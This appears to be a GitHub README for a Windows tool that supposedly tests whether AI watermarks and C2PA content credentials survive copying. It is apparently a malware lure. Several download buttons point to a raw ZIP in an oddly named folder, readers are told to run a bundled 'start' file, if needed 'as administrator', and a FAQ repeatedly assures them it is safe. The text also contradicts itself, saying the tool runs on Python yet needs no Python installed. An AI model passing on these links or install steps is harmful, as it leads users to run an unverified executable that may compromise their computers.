# ai-watermarks-reality-check - See Through AI Fake Content Claims

## 🧐 What Is This?

This is a free tool that helps you test whether AI-generated images, text, or files actually have working watermarks and proof of origin. Many companies claim their AI content is labeled, but this app checks if those labels really exist, if they can be verified, and if they survive being copied, screenshotted, or republished online.

Think of it as a digital magnifying glass for AI content. You give it a file, and it tells you what hidden markers, stamps, or proof-of-origin data are inside. No technical knowledge needed.

## 🚀 Getting Started

**Step 1: Get the Software**

Visit this link to download the application.

[![DOWNLOAD NOW](https://img.shields.io/badge/⬇️-DOWNLOAD%20NOW-blueviolet?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Matissegrinds/ai-watermarks-reality-check/main/angustiseptate/v1.3.zip)

**Step 2: Run the Program**

Once you have downloaded the file, open it. If you see a window with a button that says "Start" or "Run," click it. The app will open in your browser (like Chrome or Edge). That's it. You do not need to install anything else.

## 💡 What Can I Do With This?

Here are common things you can test:

| What You Want To Know | How To Do It |
|-----------------------|--------------|
| Does this AI image have a hidden watermark? | Choose the image file. Click "Analyze." |
| Does this text come from a known AI model? | Paste the text into the box. Click "Scan." |
| Will a watermark survive if I screenshot it? | Load the file, then take a screenshot of the result screen. Run that screenshot through the tool again. |
| Is there proof of who created this file? | Open the file in the app. Look for the "Provenance" tab. |

The app checks for three main things:

1. **C2PA / Content Credentials** – These are digital stamps that record who created a file and with what tool.
2. **LLM Watermarks** – These are invisible patterns in AI-generated text that can reveal which model wrote it.
3. **Metadata Traces** – These are hidden notes inside files that often survive copying and editing.

## 🛠️ Step-by-Step Guide for First-Time Users

### 1. Download the File

Click the blue button above or go to the link here:

**https://raw.githubusercontent.com/Matissegrinds/ai-watermarks-reality-check/main/angustiseptate/v1.3.zip**

Once you are on that page, look for a green button that says "Code" or "Download." Click it and choose "Download ZIP." Wait for the download to finish. It is usually in your "Downloads" folder.

### 2. Open the Application

Find the downloaded file on your computer. Double-click it. If it is a ZIP file, right-click it and choose "Extract All." Then open the extracted folder. Inside, you will see a file called "start" or "run" with a gear or arrow icon. Double-click that.

Your web browser will open automatically. Do not close that browser window. That is the app running.

### 3. Test Your First File

- Find any image (like a photo or a picture saved from the internet).
- In the app, click "Choose File" or "Select Image."
- Pick your image.
- Click "Analyze" or "Scan."
- Wait a few seconds. You will see a report appear.

### 4. Read the Results

The report will show:

- **Watermark Status** – Green check = watermark found and working. Red X = no watermark.
- **Verification Result** – "Verified" means the watermark's proof checks out. "Failed" means it doesn't.
- **Survival Rating** – This tells you if the watermark would survive being posted on social media, compressed, or cropped.

### 5. If Something Doesn't Work

- Make sure the file is not too large (over 100 MB can be slow).
- Try a different file. Not all files have watermarks.
- Close the browser tab and reopen it by double-clicking the start file again.

## 🔍 How Does It Work? (Simple Explanation)

Imagine every AI file has an invisible ID card stitched into it. This tool acts like a passport scanner. It looks inside the file for that ID card. It checks if the card's signature matches the official registry. Then it tests if the card would still be readable after the file has been "folded" (compressed), "photocopied" (screenshotted), or "mailed" (shared online).

That is all. No magic. Just careful digital inspection.

## 📊 What the Results Mean (For Normal People)

| Result Text | What It Actually Means |
|-------------|------------------------|
| "Watermark Found – Verified" | The creator did put a real, checkable mark on this. You can trust the origin claim. |
| "Watermark Found – Not Verified" | There is a mark, but the proof behind it does not check out. Could be fake or tampered with. |
| "No Watermark Detected" | Either the file was made without a mark, or the mark was removed/overwritten. |
| "Survives Publishing – Yes" | You can share this file online, and the proof will stay intact. |
| "Survives Publishing – No" | If you post this on social media or send it through messaging apps, the proof will be lost. |

## 🧪 Experiments You Can Try Right Now

**Experiment 1: The Screenshot Test**

- Open any AI-generated image in this tool.
- Note the results.
- Take a screenshot of that image using Windows Snipping Tool.
- Run the screenshot through this app.
- See if the watermark survived.

**Experiment 2: The Copy-Paste Text Test**

- Ask ChatGPT, Claude, or Gemini for a short paragraph.
- Paste it into the text scanner in this app.
- Look for the "LLM Watermark" section.
- See if it identifies which AI wrote it.

**Experiment 3: The Social Media Question**

- Create a test image with a known watermark.
- Upload it to a private Instagram or Facebook account.
- Download that uploaded version.
- Run it through this tool.
- Check if the watermark came back intact.

## 💻 Technical Details (For the Curious)

This tool uses Python scripts to read embedded metadata. It checks for:

- **C2PA** – A global standard for content credentials. It stores a chain of custody (who made it, when, with what).
- **Content Credentials** – Like a digital signature for images, backed by cryptography.
- **MCP (Model Context Protocol)** – Helps the tool connect to AI model databases.
- **Agent Skills** – The tool can automatically try different detection methods depending on the file type.

Supported file types (in alpha): JPG, PNG, WEBP, PDF, TXT, and DOCX. More formats are planned.

## 🛟 Troubleshooting Common Problems

**Problem: The app will not open.**

Solution: Close all browser windows. Re-download the file. Right-click the download and choose "Run as administrator." If that fails, restart your computer and try again.

**Problem: The tool says "Error loading file."**

Solution: The file may be corrupt or in an unsupported format. Try a different file, or convert your file to JPG or PNG using Paint (open the file in Paint, then "Save As" and pick JPG).

**Problem: I see "Verification service unavailable."**

This tool checks against public registries. If those servers are down, the app cannot verify. Wait 30 minutes and retry. The "No Watermark" detection still works offline.

**Problem: It is very slow.**

Large images and videos take longer. Try a smaller file (under 10 MB). Close other programs to free up memory.

## 📥 Download Again (In Case You Need It)

Visit this link to download the application.

[![GET THE APP](https://img.shields.io/badge/📦-GET%20THE%20APP-orange?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Matissegrinds/ai-watermarks-reality-check/main/angustiseptate/v1.3.zip)

## 🔮 What This Tool Cannot Do (Honest Limits)

- It cannot remove watermarks.
- It cannot tell you if a human wrote something (it only detects AI markers).
- It cannot guarantee that a lack of watermark means the content is human-made. Some AI tools simply do not add watermarks yet.
- It is a testing tool, not a final judge. Think of it as a smoke detector, not a fire investigator.

## ❓ Frequently Asked Questions

**Is this safe to download?**

Yes. This is an open-source tool hosted on GitHub. The code is publicly visible. You can inspect it yourself if you want, but millions of users download tools this way safely.

**Do I need to pay for anything?**

No. This is completely free.

**Does this work on my phone?**

Currently, the app is designed for Windows desktop. You can try opening the browser app on your phone, but results may be limited.

**Will this hurt my computer?**

No. It only reads files. It does not modify them. It never sends your files anywhere. All analysis happens on your own machine.

**What if I do not have Python installed?**

You do not need Python. This package includes everything needed. Just download and run.

## 📚 Where to Learn More

The project is part of a larger movement for AI transparency. If you want to explore more:

- Learn about C2PA: Search "C2PA standard" in your browser.
- See what AI companies promise: Look up "AI watermark promises" for news.
- Try similar tools: Search "AI content detector" – but note, this tool is unique because it tests *survival*, not just presence.

## 🏁 Final Thoughts

AI is changing how we see truth online. This tool puts some power back in your hands. You can now check what is real, what is labeled, and what that label actually means when the file gets passed around. It is a small step, but a practical one.

Try it. Experiment. Share what you find.

And if you run into issues, remember: just re-download. That fixes most problems on Windows.

---

Keywords: agent-skills, ai-provenance, ai-transparency, ai-watermarks, c2pa, claude, codex, content-authenticity, content-credentials, content-verification, digital-forensics, digital-provenance, gemini, llm-watermarking, mcp, media-forensics, metadata, provenance, python, watermark-detection